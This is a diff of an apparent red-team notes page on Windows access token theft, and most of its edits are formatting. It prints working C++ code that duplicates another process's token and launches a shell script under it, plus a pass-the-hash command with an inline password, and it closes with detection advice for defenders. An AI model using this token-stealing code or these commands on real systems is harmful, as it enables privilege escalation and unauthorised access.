@@ -38,24 +38,24 @@ This is the code if you want to compile and try it yourself:
 #include <iostream>
 
 int main(int argc, char * argv[]) {
-	char a;
-	HANDLE processHandle;
-	HANDLE tokenHandle = NULL;
-	HANDLE duplicateTokenHandle = NULL;
-	STARTUPINFO startupInfo;
-	PROCESS_INFORMATION processInformation;
-	DWORD PID_TO_IMPERSONATE = 3060;
-	wchar_t cmdline[] = L"C:\\shell.cmd";
-	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
-	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
-	startupInfo.cb = sizeof(STARTUPINFO);	
+    char a;
+    HANDLE processHandle;
+    HANDLE tokenHandle = NULL;
+    HANDLE duplicateTokenHandle = NULL;
+    STARTUPINFO startupInfo;
+    PROCESS_INFORMATION processInformation;
+    DWORD PID_TO_IMPERSONATE = 3060;
+    wchar_t cmdline[] = L"C:\\shell.cmd";
+    ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
+    ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
+    startupInfo.cb = sizeof(STARTUPINFO);    
 
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
-	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
-	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);			
-	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
-	
-	std::cin >> a;
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
+    OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
+    DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);            
+    CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
+
+    std::cin >> a;
     return 0;
 }
 ```
@@ -67,7 +67,7 @@ Launching `Tokens.exe` from the powershell console spawns a reverse shell that t
 
 ![](../../.gitbook/assets/token-shell-impersonated.png)
 
-The logon for OFFESNE\administrator in the above test was of logon type 2 \(interactive logon, meaning I launched a new process on the victim system using a `runas /user:administrator@offense cmd` command\). 
+The logon for OFFESNE\administrator in the above test was of logon type 2 \(interactive logon, meaning I launched a new process on the victim system using a `runas /user:administrator@offense cmd` command\).
 
 Another quick test that I wanted to do was a theft of an access token that was present in the system due to a network logon \(i.e psexec, winexec, pth-winexe, etc\), so I spawned a cmd shell remotely from the attacking machine to the victim machine using:
 
@@ -101,7 +101,7 @@ Running the compiled code invokes a new process with the newly stolen token:
 
 note the cmd.exe has a PID 5188 - if we rerun the `Invoke-TokenManipulation`, we can see the new process is using the access token with logon type 3:
 
-![](../../.gitbook/assets/token-new-logon-3%20%281%29.png)
+![](../../.gitbook/assets/token-new-logon-3-1.png)
 
 ## Observations
 
@@ -109,7 +109,7 @@ Imagine you were investigating the host we stole the tokens from, because it exh
 
 ![](../../.gitbook/assets/token-disasm.png)
 
-As suggested by the above, you should think about API monitoring if you want to detect these token manipulations on endpoints, but beware - this can be quite noisy. 
+As suggested by the above, you should think about API monitoring if you want to detect these token manipulations on endpoints, but beware - this can be quite noisy.
 
 Windows event logs of IDs `4672` and `4674` may be helpful for you as a defender also - below shows a network logon of a `pth-winexe //10.0.0.2 -U offense/administrator%pass cmd` and then later, a netcat reverse shell originating from the same logon session:
 
@@ -117,25 +117,25 @@ Windows event logs of IDs `4672` and `4674` may be helpful for you as a defender
 
 ## References
 
-{% embed url="https://attack.mitre.org/wiki/Technique/T1134" %}
+{% embed url="https://attack.mitre.org/wiki/Technique/T1134" caption="" %}
 
-{% embed url="https://digital-forensics.sans.org/blog/2012/03/21/protecting-privileged-domain-accounts-access-tokens" %}
+{% embed url="https://digital-forensics.sans.org/blog/2012/03/21/protecting-privileged-domain-accounts-access-tokens" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly\#-security-primary-token-gly" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly\#-security-primary-token-gly" caption="" %}
 
-{% embed url="https://technet.microsoft.com/pt-pt/library/cc783557%28v=ws.10%29.aspx?f=255&MSPPError=-2147217396" %}
+{% embed url="https://technet.microsoft.com/pt-pt/library/cc783557%28v=ws.10%29.aspx?f=255&MSPPError=-2147217396" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/access-tokens" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/access-tokens" caption="" %}
 
-{% embed url="https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/" %}
+{% embed url="https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/" caption="" %}
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671\(v=vs.85\).aspx" %}
+{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671\(v=vs.85\).aspx" caption="" %}
 
-{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw" %}
+{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw" caption="" %}
 
-{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617\(v=vs.85\).aspx" %}
+{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617\(v=vs.85\).aspx" caption="" %}
 
-{% embed url="https://www.youtube.com/watch?v=Ed\_2BKn3QR8" %}
+{% embed url="https://www.youtube.com/watch?v=Ed\_2BKn3QR8" caption="" %}
 
 [https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf](https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf)
 
